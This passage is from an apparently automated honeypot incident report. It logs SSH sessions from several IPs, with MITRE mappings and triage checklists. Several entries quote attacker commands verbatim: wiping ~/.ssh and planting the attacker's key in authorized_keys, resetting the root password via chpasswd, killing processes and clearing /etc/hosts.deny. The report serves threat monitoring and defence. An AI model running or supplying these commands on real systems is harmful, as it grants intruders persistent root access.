| `2026-06-06 16:11:55` | `cowrie.command.failed` |
| `2026-06-06 16:11:56` | `cowrie.log.closed` |
| `2026-06-06 16:11:56` | `cowrie.session.params` |
| `2026-06-06 16:11:56` | `cowrie.command.input` |
| `2026-06-06 16:11:56` | `cowrie.session.file_download` |
| `2026-06-06 16:11:56` | `cowrie.log.closed` |
| `2026-06-06 16:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-918cfb2a5e03

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 16:11 |
| **Last Seen** | 2026-06-06 16:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:11:58` | `cowrie.session.connect` |
| `2026-06-06 16:11:58` | `cowrie.client.version` |
| `2026-06-06 16:11:58` | `cowrie.client.kex` |
| `2026-06-06 16:11:58` | `cowrie.login.success` |
| `2026-06-06 16:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-619d82137d4f

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:12 |
| **Last Seen** | 2026-06-06 16:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:12:51` | `cowrie.session.connect` |
| `2026-06-06 16:12:51` | `cowrie.client.version` |
| `2026-06-06 16:12:51` | `cowrie.client.kex` |
| `2026-06-06 16:12:52` | `cowrie.login.success` |
| `2026-06-06 16:12:53` | `cowrie.session.params` |
| `2026-06-06 16:12:53` | `cowrie.command.input` |
| `2026-06-06 16:12:53` | `cowrie.command.failed` |
| `2026-06-06 16:12:53` | `cowrie.log.closed` |
| `2026-06-06 16:12:53` | `cowrie.session.params` |
| `2026-06-06 16:12:53` | `cowrie.command.input` |
| `2026-06-06 16:12:54` | `cowrie.session.file_download` |
| `2026-06-06 16:12:54` | `cowrie.log.closed` |
| `2026-06-06 16:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98667e77d725

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:12 |
| **Last Seen** | 2026-06-06 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:12:57` | `cowrie.session.connect` |
| `2026-06-06 16:12:57` | `cowrie.client.version` |
| `2026-06-06 16:12:57` | `cowrie.client.kex` |
| `2026-06-06 16:12:58` | `cowrie.login.success` |
| `2026-06-06 16:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e51aface07b

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 16:13 |
| **Last Seen** | 2026-06-06 16:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:13:03` | `cowrie.session.connect` |
| `2026-06-06 16:13:03` | `cowrie.client.version` |
| `2026-06-06 16:13:03` | `cowrie.client.kex` |
| `2026-06-06 16:13:04` | `cowrie.login.success` |
| `2026-06-06 16:13:04` | `cowrie.session.params` |
| `2026-06-06 16:13:04` | `cowrie.command.input` |
| `2026-06-06 16:13:04` | `cowrie.command.failed` |
| `2026-06-06 16:13:05` | `cowrie.log.closed` |
| `2026-06-06 16:13:05` | `cowrie.session.params` |
| `2026-06-06 16:13:05` | `cowrie.command.input` |
| `2026-06-06 16:13:05` | `cowrie.session.file_download` |
| `2026-06-06 16:13:05` | `cowrie.log.closed` |
| `2026-06-06 16:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a08d2609c4f

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 16:13 |
| **Last Seen** | 2026-06-06 16:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:13:07` | `cowrie.session.connect` |
| `2026-06-06 16:13:07` | `cowrie.client.version` |
| `2026-06-06 16:13:07` | `cowrie.client.kex` |
| `2026-06-06 16:13:08` | `cowrie.login.success` |
| `2026-06-06 16:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54d52df89258

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 16:14 |
| **Last Seen** | 2026-06-06 16:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:14:03` | `cowrie.session.connect` |
| `2026-06-06 16:14:03` | `cowrie.client.version` |
| `2026-06-06 16:14:03` | `cowrie.client.kex` |
| `2026-06-06 16:14:04` | `cowrie.login.success` |
| `2026-06-06 16:14:04` | `cowrie.session.params` |
| `2026-06-06 16:14:04` | `cowrie.command.input` |
| `2026-06-06 16:14:04` | `cowrie.command.failed` |
| `2026-06-06 16:14:04` | `cowrie.log.closed` |
| `2026-06-06 16:14:04` | `cowrie.session.params` |
| `2026-06-06 16:14:04` | `cowrie.command.input` |
| `2026-06-06 16:14:04` | `cowrie.session.file_download` |
| `2026-06-06 16:14:04` | `cowrie.log.closed` |
| `2026-06-06 16:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3c81bd873b2

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 16:14 |
| **Last Seen** | 2026-06-06 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:14:06` | `cowrie.session.connect` |
| `2026-06-06 16:14:06` | `cowrie.client.version` |
| `2026-06-06 16:14:06` | `cowrie.client.kex` |
| `2026-06-06 16:14:07` | `cowrie.login.success` |
| `2026-06-06 16:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c4787960117

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]231` |
| **First Seen** | 2026-06-06 16:18 |
| **Last Seen** | 2026-06-06 16:19 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:rvq3wFmaBrVn"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:18:38` | `cowrie.session.connect` |
| `2026-06-06 16:18:38` | `cowrie.client.version` |
| `2026-06-06 16:18:38` | `cowrie.client.kex` |
| `2026-06-06 16:18:41` | `cowrie.login.success` |
| `2026-06-06 16:18:42` | `cowrie.session.params` |
| `2026-06-06 16:18:42` | `cowrie.command.input` |
| `2026-06-06 16:18:42` | `cowrie.command.failed` |
| `2026-06-06 16:18:42` | `cowrie.log.closed` |
| `2026-06-06 16:18:42` | `cowrie.session.params` |
| `2026-06-06 16:18:42` | `cowrie.command.input` |
| `2026-06-06 16:18:42` | `cowrie.session.file_download` |
| `2026-06-06 16:18:42` | `cowrie.log.closed` |
| `2026-06-06 16:18:55` | `cowrie.session.params` |
| `2026-06-06 16:18:55` | `cowrie.command.input` |
| `2026-06-06 16:18:55` | `cowrie.log.closed` |
| `2026-06-06 16:18:56` | `cowrie.session.params` |
| `2026-06-06 16:18:56` | `cowrie.command.input` |
| `2026-06-06 16:18:56` | `cowrie.log.closed` |
| `2026-06-06 16:18:56` | `cowrie.session.params` |
| `2026-06-06 16:18:56` | `cowrie.command.input` |
| `2026-06-06 16:18:56` | `cowrie.session.file_download` |
| `2026-06-06 16:18:56` | `cowrie.log.closed` |
| `2026-06-06 16:18:57` | `cowrie.session.params` |
| `2026-06-06 16:18:57` | `cowrie.command.input` |
| `2026-06-06 16:18:57` | `cowrie.log.closed` |
| `2026-06-06 16:18:57` | `cowrie.session.params` |
| `2026-06-06 16:18:57` | `cowrie.command.input` |
| `2026-06-06 16:18:57` | `cowrie.log.closed` |
| `2026-06-06 16:18:57` | `cowrie.session.params` |
| `2026-06-06 16:18:57` | `cowrie.command.input` |
| `2026-06-06 16:18:57` | `cowrie.command.input` |
| `2026-06-06 16:18:58` | `cowrie.log.closed` |
| `2026-06-06 16:18:58` | `cowrie.session.params` |
| `2026-06-06 16:18:58` | `cowrie.command.input` |
| `2026-06-06 16:18:58` | `cowrie.log.closed` |
| `2026-06-06 16:18:58` | `cowrie.session.params` |
| `2026-06-06 16:18:58` | `cowrie.command.input` |
| `2026-06-06 16:18:58` | `cowrie.log.closed` |
| `2026-06-06 16:18:59` | `cowrie.session.params` |
| `2026-06-06 16:18:59` | `cowrie.command.input` |
| `2026-06-06 16:18:59` | `cowrie.log.closed` |
| `2026-06-06 16:18:59` | `cowrie.session.params` |
| `2026-06-06 16:18:59` | `cowrie.command.input` |
| `2026-06-06 16:18:59` | `cowrie.log.closed` |
| `2026-06-06 16:19:00` | `cowrie.session.params` |
| `2026-06-06 16:19:00` | `cowrie.command.input` |
| `2026-06-06 16:19:00` | `cowrie.log.closed` |
| `2026-06-06 16:19:00` | `cowrie.session.params` |
| `2026-06-06 16:19:00` | `cowrie.command.input` |
| `2026-06-06 16:19:00` | `cowrie.log.closed` |
| `2026-06-06 16:19:01` | `cowrie.session.params` |
| `2026-06-06 16:19:01` | `cowrie.command.input` |
| `2026-06-06 16:19:01` | `cowrie.log.closed` |
| `2026-06-06 16:19:01` | `cowrie.session.params` |
| `2026-06-06 16:19:01` | `cowrie.command.input` |
| `2026-06-06 16:19:01` | `cowrie.log.closed` |
| `2026-06-06 16:19:01` | `cowrie.session.params` |
| `2026-06-06 16:19:01` | `cowrie.command.input` |
| `2026-06-06 16:19:02` | `cowrie.log.closed` |
| `2026-06-06 16:19:02` | `cowrie.session.params` |
| `2026-06-06 16:19:02` | `cowrie.command.input` |
| `2026-06-06 16:19:02` | `cowrie.log.closed` |
| `2026-06-06 16:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]231` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f583c84ec03

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 16:19 |
| **Last Seen** | 2026-06-06 16:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:19:03` | `cowrie.session.connect` |
| `2026-06-06 16:19:03` | `cowrie.client.version` |
| `2026-06-06 16:19:03` | `cowrie.client.kex` |
| `2026-06-06 16:19:04` | `cowrie.login.success` |
| `2026-06-06 16:19:04` | `cowrie.session.params` |
| `2026-06-06 16:19:04` | `cowrie.command.input` |
| `2026-06-06 16:19:04` | `cowrie.command.failed` |
| `2026-06-06 16:19:05` | `cowrie.log.closed` |
| `2026-06-06 16:19:05` | `cowrie.session.params` |
| `2026-06-06 16:19:05` | `cowrie.command.input` |
| `2026-06-06 16:19:05` | `cowrie.session.file_download` |
| `2026-06-06 16:19:05` | `cowrie.log.closed` |
| `2026-06-06 16:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b57103f335ef

| Field | Detail |
|---|---|
| **Source IP** | `52.169.217[.]131` |
| **First Seen** | 2026-06-06 16:19 |
| **Last Seen** | 2026-06-06 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:19:07` | `cowrie.session.connect` |
| `2026-06-06 16:19:07` | `cowrie.client.version` |
| `2026-06-06 16:19:07` | `cowrie.client.kex` |
| `2026-06-06 16:19:08` | `cowrie.login.success` |
| `2026-06-06 16:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.169.217[.]131` to AbuseIPDB if not already reported
- [ ] Block `52.169.217[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b74af5508f

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 16:24 |
| **Last Seen** | 2026-06-06 16:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:24:38` | `cowrie.session.connect` |
| `2026-06-06 16:24:38` | `cowrie.client.version` |
| `2026-06-06 16:24:38` | `cowrie.client.kex` |
| `2026-06-06 16:24:38` | `cowrie.login.success` |
| `2026-06-06 16:24:38` | `cowrie.session.params` |
| `2026-06-06 16:24:38` | `cowrie.command.input` |
| `2026-06-06 16:24:38` | `cowrie.command.failed` |
| `2026-06-06 16:24:39` | `cowrie.log.closed` |
| `2026-06-06 16:24:39` | `cowrie.session.params` |
| `2026-06-06 16:24:39` | `cowrie.command.input` |
| `2026-06-06 16:24:39` | `cowrie.session.file_download` |
| `2026-06-06 16:24:39` | `cowrie.log.closed` |
| `2026-06-06 16:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4836e5b9db45

| Field | Detail |
|---|---|
| **Source IP** | `103.61.123[.]132` |
| **First Seen** | 2026-06-06 16:24 |
| **Last Seen** | 2026-06-06 16:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:24:41` | `cowrie.session.connect` |
| `2026-06-06 16:24:41` | `cowrie.client.version` |
| `2026-06-06 16:24:41` | `cowrie.client.kex` |
| `2026-06-06 16:24:41` | `cowrie.login.success` |
| `2026-06-06 16:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.123[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.61.123[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f6567af06a

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:29 |
| **Last Seen** | 2026-06-06 16:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:29:54` | `cowrie.session.connect` |
| `2026-06-06 16:29:54` | `cowrie.client.version` |
| `2026-06-06 16:29:55` | `cowrie.client.kex` |
| `2026-06-06 16:29:56` | `cowrie.login.success` |
| `2026-06-06 16:29:56` | `cowrie.session.params` |
| `2026-06-06 16:29:56` | `cowrie.command.input` |
| `2026-06-06 16:29:56` | `cowrie.command.failed` |
| `2026-06-06 16:29:57` | `cowrie.log.closed` |
| `2026-06-06 16:29:57` | `cowrie.session.params` |
| `2026-06-06 16:29:57` | `cowrie.command.input` |
| `2026-06-06 16:29:57` | `cowrie.session.file_download` |
| `2026-06-06 16:29:57` | `cowrie.log.closed` |
| `2026-06-06 16:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c8b78fb9f7

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:30 |
| **Last Seen** | 2026-06-06 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:30:00` | `cowrie.session.connect` |
| `2026-06-06 16:30:00` | `cowrie.client.version` |
| `2026-06-06 16:30:01` | `cowrie.client.kex` |
| `2026-06-06 16:30:02` | `cowrie.login.success` |
| `2026-06-06 16:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aefc7690ce7

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:31 |
| **Last Seen** | 2026-06-06 16:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
